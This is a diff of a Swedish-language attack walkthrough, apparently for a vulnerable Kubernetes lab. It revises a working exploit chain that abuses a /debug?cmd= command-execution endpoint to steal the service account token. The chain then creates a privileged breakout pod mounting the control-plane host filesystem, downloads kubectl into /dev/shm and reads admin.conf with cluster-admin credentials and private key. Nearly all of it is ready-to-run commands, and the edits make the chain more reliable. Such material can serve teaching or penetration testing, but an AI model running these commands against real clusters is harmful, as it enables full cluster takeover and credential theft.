@@ -306,7 +306,7 @@ Förutsättning: angriparen har hittat webbappens exponerade `/debug?cmd=`-endpo
 
 > **`/debug`-endpointen är initial access, inte ett krav för Brist 1.** Vilket RCE-hål eller path traversal som helst som kan läsa `/var/run/secrets/kubernetes.io/serviceaccount/token` ger samma resultat. Endpointen är i sig en egen brist; token-stölden fungerar identiskt via t.ex. SSTI, deserialisering eller en sårbar dependency.
 
-Kubernetes API-servern behöver **inte** vara externt nåbar — alla API-anrop sker inifrån webapp-containern mot `kubernetes.default.svc` (ClusterIP, alltid tillgänglig inuti klustret). Angripardatorn skickar enbart HTTP-anrop mot webapp-porten.
+Kubernetes API-servern behöver **inte** vara externt nåbar — alla API-anrop sker inifrån webapp-containern mot Kubernetes API-servern vars adress Kubernetes automatiskt injicerar som miljövariablerna `KUBERNETES_SERVICE_HOST` och `KUBERNETES_SERVICE_PORT` i varje pod. Observera att DNS (`kubernetes.default.svc`) inte nödvändigtvis fungerar inuti containern beroende på CoreDNS-status — env-variabelmetoden är mer robust. Angripardatorn skickar enbart HTTP-anrop mot webapp-porten.
 
 ```bash
 WEBAPP="http://<WEBAPP-IP>:30500"
@@ -315,22 +315,23 @@ WEBAPP="http://<WEBAPP-IP>:30500"
 TOKEN=$(curl -s --get --data-urlencode 'cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token' "$WEBAPP/debug")
 
 # Steg 2: Verifiera cluster-admin-åtkomst via intern K8s API (Python inbyggt i Flask-containern)
+# Använd KUBERNETES_SERVICE_HOST/PORT-env-variablerna — DNS kan vara otillgängligt i containern
 curl -s --get --data-urlencode \
-  'cmd=python3 -c "import urllib.request,ssl,json; t=open(\"/var/run/secrets/kubernetes.io/serviceaccount/token\").read(); ctx=ssl.SSLContext(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE; r=json.loads(urllib.request.urlopen(urllib.request.Request(\"https://kubernetes.default.svc/api/v1/namespaces/default/pods\",headers={\"Authorization\":\"Bearer \"+t}),context=ctx).read()); print([p[\"metadata\"][\"name\"] for p in r[\"items\"]])"' \
+  'cmd=python3 -c "import urllib.request,ssl,json,os; t=open(\"/var/run/secrets/kubernetes.io/serviceaccount/token\").read(); h=os.environ[\"KUBERNETES_SERVICE_HOST\"]; p=os.environ[\"KUBERNETES_SERVICE_PORT\"]; ctx=ssl._create_unverified_context(); r=json.loads(urllib.request.urlopen(urllib.request.Request(f\"https://{h}:{p}/api/v1/namespaces/default/pods\",headers={\"Authorization\":\"Bearer \"+t}),context=ctx).read()); print([x[\"metadata\"][\"name\"] for x in r[\"items\"]])" 2>&1' \
   "$WEBAPP/debug"
 # → listar alla pods utan 403 — bekräftar cluster-admin
 
 # Steg 3: Skapa breakout-pod med host-filsystemet monterat på control plane
 # nodeSelector styr att podden hamnar på mastern (admin.conf finns bara där)
 curl -s --get --data-urlencode \
-  'cmd=python3 -c "import urllib.request,ssl,json; t=open(\"/var/run/secrets/kubernetes.io/serviceaccount/token\").read(); ctx=ssl.SSLContext(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE; body=json.dumps({\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"name\":\"breakout\"},\"spec\":{\"hostPID\":True,\"nodeSelector\":{\"node-role.kubernetes.io/control-plane\":\"\"},\"tolerations\":[{\"key\":\"node-role.kubernetes.io/control-plane\",\"operator\":\"Exists\",\"effect\":\"NoSchedule\"}],\"containers\":[{\"name\":\"breakout\",\"image\":\"ubuntu\",\"command\":[\"sleep\",\"3600\"],\"volumeMounts\":[{\"mountPath\":\"/host\",\"name\":\"host-root\"}],\"securityContext\":{\"privileged\":True}}],\"volumes\":[{\"name\":\"host-root\",\"hostPath\":{\"path\":\"/\"}}]}}).encode(); req=urllib.request.Request(\"https://kubernetes.default.svc/api/v1/namespaces/default/pods\",data=body,headers={\"Authorization\":\"Bearer \"+t,\"Content-Type\":\"application/json\"},method=\"POST\"); print(urllib.request.urlopen(req,context=ctx).read().decode()[:100])"' \
+  'cmd=python3 -c "import urllib.request,ssl,json,os; t=open(\"/var/run/secrets/kubernetes.io/serviceaccount/token\").read(); h=os.environ[\"KUBERNETES_SERVICE_HOST\"]; p=os.environ[\"KUBERNETES_SERVICE_PORT\"]; ctx=ssl._create_unverified_context(); body=json.dumps({\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"name\":\"breakout\"},\"spec\":{\"hostPID\":True,\"nodeSelector\":{\"node-role.kubernetes.io/control-plane\":\"\"},\"tolerations\":[{\"key\":\"node-role.kubernetes.io/control-plane\",\"operator\":\"Exists\",\"effect\":\"NoSchedule\"}],\"containers\":[{\"name\":\"breakout\",\"image\":\"ubuntu\",\"command\":[\"sleep\",\"3600\"],\"volumeMounts\":[{\"mountPath\":\"/host\",\"name\":\"host-root\"}],\"securityContext\":{\"privileged\":True}}],\"volumes\":[{\"name\":\"host-root\",\"hostPath\":{\"path\":\"/\"}}]}}).encode(); req=urllib.request.Request(f\"https://{h}:{p}/api/v1/namespaces/default/pods\",data=body,headers={\"Authorization\":\"Bearer \"+t,\"Content-Type\":\"application/json\"},method=\"POST\"); print(urllib.request.urlopen(req,context=ctx).read().decode()[:100])" 2>&1' \
   "$WEBAPP/debug"
 
 # Steg 4: Ladda ned kubectl och exec:a in i breakout-podden
 # /tmp är noexec i containern — använd /dev/shm (RAM, körbar)
 # Allt kedjat i ett enda anrop: lastbalansering kan annars skicka requests till olika pod-instanser
 curl -s --get --data-urlencode \
-  'cmd=python3 -c "import urllib.request; urllib.request.urlretrieve(\"https://dl.k8s.io/release/v1.31.0/bin/linux/amd64/kubectl\",\"/dev/shm/kubectl\")" && chmod 755 /dev/shm/kubectl && /dev/shm/kubectl --insecure-skip-tls-verify --server=https://kubernetes.default.svc --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) exec breakout -- cat /host/etc/kubernetes/admin.conf 2>&1' \
+  'cmd=python3 -c "import urllib.request; urllib.request.urlretrieve(\"https://dl.k8s.io/release/v1.31.0/bin/linux/amd64/kubectl\",\"/dev/shm/kubectl\")" && chmod 755 /dev/shm/kubectl && /dev/shm/kubectl --insecure-skip-tls-verify --server=https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT} --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) exec breakout -- cat /host/etc/kubernetes/admin.conf 2>&1' \
   "$WEBAPP/debug"
 # → admin.conf med fullständiga cluster-admin-credentials inklusive privat RSA-nyckel
 ```
